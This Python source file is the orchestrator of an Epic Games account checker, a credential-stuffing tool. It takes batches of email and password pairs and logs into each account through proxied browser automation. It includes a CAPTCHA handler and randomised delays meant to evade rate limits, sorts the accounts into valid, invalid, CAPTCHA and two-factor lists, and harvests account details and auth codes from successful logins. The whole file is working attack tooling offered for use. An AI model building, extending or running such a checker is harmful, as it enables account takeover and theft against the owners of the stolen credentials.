"""
Modular Epic Games Account Checker
Main orchestrator that coordinates all components for account checking
"""
import asyncio
import logging
import random
import time
from typing import List, Tuple, Dict, Any
from datetime import datetime

from .browser_manager import BrowserManager
from .turnstile_handler import TurnstileHandler
from .auth_handler import AuthHandler, AccountStatus
from .login_handler import LoginHandler

from config.settings import (
    MIN_DELAY_SINGLE_PROXY, MAX_DELAY_SINGLE_PROXY,
    MIN_DELAY_MULTI_PROXY, MAX_DELAY_MULTI_PROXY,
    DEBUG_ENHANCED_FEATURES
)

logger = logging.getLogger(__name__)


class AccountChecker:
    """
    Main account checker class that orchestrates all components
    """
    
    def __init__(self, proxies: List[str] = None):
        self.browser_manager = BrowserManager(proxies)
        self.turnstile_handler = TurnstileHandler()
        self.auth_handler = AuthHandler()
        self.login_handler = LoginHandler(self.turnstile_handler, self.auth_handler)
        
        # Delay settings for intelligent timing
        self.min_delay_single = MIN_DELAY_SINGLE_PROXY
        self.max_delay_single = MAX_DELAY_SINGLE_PROXY
        self.min_delay_multi = MIN_DELAY_MULTI_PROXY
        self.max_delay_multi = MAX_DELAY_MULTI_PROXY
        
        self.single_proxy_mode = len(proxies or []) == 1
    
    async def __aenter__(self):
        """Initialize all components"""
        await self.browser_manager.__aenter__()
        await self.auth_handler.__aenter__()
        return self
    
    async def __aexit__(self, _exc_type, _exc_val, _exc_tb):
        """Clean up all components"""
        await self.browser_manager.__aexit__(_exc_type, _exc_val, _exc_tb)
        await self.auth_handler.__aexit__(_exc_type, _exc_val, _exc_tb)
    
    async def check_account(self, email: str, password: str, proxy: str = None) -> Tuple[AccountStatus, Dict[str, Any]]:
        """
        Check a single Epic Games account
        """
        start_time = time.time()
        
        async with self.browser_manager.semaphore:
            try:
                logger.info(f"🚀 {email} - Starting account check...")
                
                # Get proxy for this check
                if proxy is None:
                    proxy = self.browser_manager.get_proxy_for_check()
                
                # Get or launch browser
                browser = await self.browser_manager.get_or_launch_browser(proxy)
                
                # Get optimized context
                proxy_key = f"{proxy or '__noproxy__'}"
                context = await self.browser_manager.get_optimized_context(browser, proxy_key)
                
                # Create new page
                page = await context.new_page()
                
                try:
                    # Perform login
                    login_success, login_result = await self.login_handler.perform_login(page, email, password)
                    
                    if not login_success:
                        # Determine the specific failure reason
                        error_msg = login_result.get('error', 'Unknown login error')
                        
                        if 'captcha' in error_msg.lower() or 'challenge' in error_msg.lower():
                            status = AccountStatus.CAPTCHA
                        elif '2fa' in error_msg.lower() or 'two-factor' in error_msg.lower():
                            status = AccountStatus.TWO_FA
                        elif 'invalid' in error_msg.lower() or 'credentials' in error_msg.lower():
                            status = AccountStatus.INVALID
                        else:
                            status = AccountStatus.ERROR
                        
                        elapsed_time = round(time.time() - start_time, 2)
                        return status, {
                            **login_result,
                            'elapsed_time': elapsed_time,
                            'proxy_used': proxy
                        }
                    
                    # Login successful, process the account data
                    account_data = await self._process_successful_login(page, email, login_result)
                    
                    elapsed_time = round(time.time() - start_time, 2)
                    
                    final_result = {
                        **account_data,
                        'elapsed_time': elapsed_time,
                        'proxy_used': proxy,
                        'check_timestamp': datetime.now().isoformat()
                    }
                    
                    logger.info(f"✅ {email} - Account check completed successfully in {elapsed_time}s")
                    return AccountStatus.VALID, final_result
                    
                finally:
                    # Clean up page
                    try:
                        await page.close()
                    except:
                        pass
                    
                    # Increment checks counter for cleanup
                    self.browser_manager.checks_performed += 1
                    await self.browser_manager.cleanup_old_contexts()
                    
                    # Apply intelligent delay
                    await self._apply_intelligent_delay()
                    
            except Exception as e:
                elapsed_time = round(time.time() - start_time, 2)
                logger.info(f"❌ {email} - Account check failed: {str(e)}")
                
                return AccountStatus.ERROR, {
                    'error': f'Check failed: {str(e)}',
                    'elapsed_time': elapsed_time,
                    'proxy_used': proxy
                }
    
    async def _process_successful_login(self, page: Any, email: str, login_result: Dict[str, Any]) -> Dict[str, Any]:
        """Process successful login and extract account information"""
        try:
            logger.info(f"📋 {email} - Processing successful login...")
            
            # Get account info from login result
            account_info = login_result.get('account_info', {})
            auth_code = login_result.get('auth_code')
            
            # If we have an auth code, try to get more detailed information
            if auth_code:
                logger.info(f"🔑 {email} - Using auth code for detailed account info...")
                detailed_info = await self.auth_handler.fetch_account_details_with_auth(auth_code, email)
                
                if not detailed_info.get('error'):
                    account_info.update(detailed_info)
                else:
                    logger.info(f"⚠️ {email} - Auth code fetch failed: {detailed_info.get('error')}")
            
            # If we don't have detailed info, try to get it from the current page
            if not account_info.get('account_id') and not account_info.get('displayName'):
                logger.info(f"📄 {email} - Extracting account info from page...")
                page_info = await self.auth_handler.get_account_info_from_page(page, email)
                account_info.update(page_info)
            
            # Ensure we have basic required fields
            result = {
                'email': email,
                'login_successful': True,
                'account_id': account_info.get('id') or account_info.get('account_id', ''),
                'display_name': account_info.get('displayName') or account_info.get('display_name', ''),
                'country': account_info.get('country', ''),
                'language': account_info.get('lang') or account_info.get('language', ''),
                'is_logged_in': account_info.get('isLoggedIn', True),
                'auth_method': 'browser_login'
            }
            
            # Add optional fields if available
            if account_info.get('created_at'):
                result['created_at'] = account_info['created_at']
            if account_info.get('last_login'):
                result['last_login'] = account_info['last_login']
            if auth_code:
                result['auth_code'] = auth_code
                result['auth_method'] = 'auth_code'
            
            logger.info(f"✅ {email} - Account information processed successfully")
            return result
            
        except Exception as e:
            logger.info(f"❌ {email} - Error processing login result: {str(e)}")
            return {
                'email': email,
                'login_successful': True,
                'error': f'Processing error: {str(e)}',
                'auth_method': 'browser_login'
            }
    
    async def _apply_intelligent_delay(self):
        """Apply intelligent delay between checks based on proxy configuration"""
        try:
            if self.single_proxy_mode:
                # Longer delays for single proxy to avoid rate limiting
                delay = random.uniform(self.min_delay_single, self.max_delay_single)
                if DEBUG_ENHANCED_FEATURES:
                    logger.info(f"⏳ Single proxy delay: {delay:.1f}s")
            else:
                # Shorter delays for multiple proxies
                delay = random.uniform(self.min_delay_multi, self.max_delay_multi)
                if DEBUG_ENHANCED_FEATURES:
                    logger.info(f"⏳ Multi proxy delay: {delay:.1f}s")
            
            await asyncio.sleep(delay)
            
        except Exception as e:
            logger.info(f"⚠️ Error applying delay: {e}")
            await asyncio.sleep(1)  # Fallback delay
    
    async def check_accounts_batch(self, accounts: List[Tuple[str, str]], progress_callback=None) -> Dict[str, List[Tuple[str, str, Dict[str, Any]]]]:
        """
        Check multiple accounts in batch with proper concurrency control
        """
        logger.info(f"🚀 Starting batch check of {len(accounts)} accounts...")
        
        results = {
            'valid': [],
            'invalid': [],
            'captcha': [],
            '2fa': [],
            'error': []
        }
        
        total_accounts = len(accounts)
        completed = 0
        
        async def check_single_account(email_password_tuple):
            nonlocal completed
            
            email, password = email_password_tuple
            try:
                status, result = await self.check_account(email, password)
                
                # Add to appropriate result category
                category = status.value
                results[category].append((email, password, result))
                
                completed += 1
                
                # Call progress callback if provided
                if progress_callback:
                    try:
                        await progress_callback(completed, total_accounts, status.value, email)
                    except:
                        pass
                
                logger.info(f"📊 Progress: {completed}/{total_accounts} - {email}: {status.value}")
                
            except Exception as e:
                logger.info(f"❌ Batch check error for {email}: {str(e)}")
                results['error'].append((email, password, {'error': str(e)}))
                completed += 1
        
        # Create tasks for all accounts
        tasks = [check_single_account(account) for account in accounts]
        
        # Execute all tasks
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Log final results
        logger.info(f"✅ Batch check completed!")
        logger.info(f"📊 Results: Valid: {len(results['valid'])}, Invalid: {len(results['invalid'])}, "
                   f"Captcha: {len(results['captcha'])}, 2FA: {len(results['2fa'])}, Error: {len(results['error'])}")
        
        return results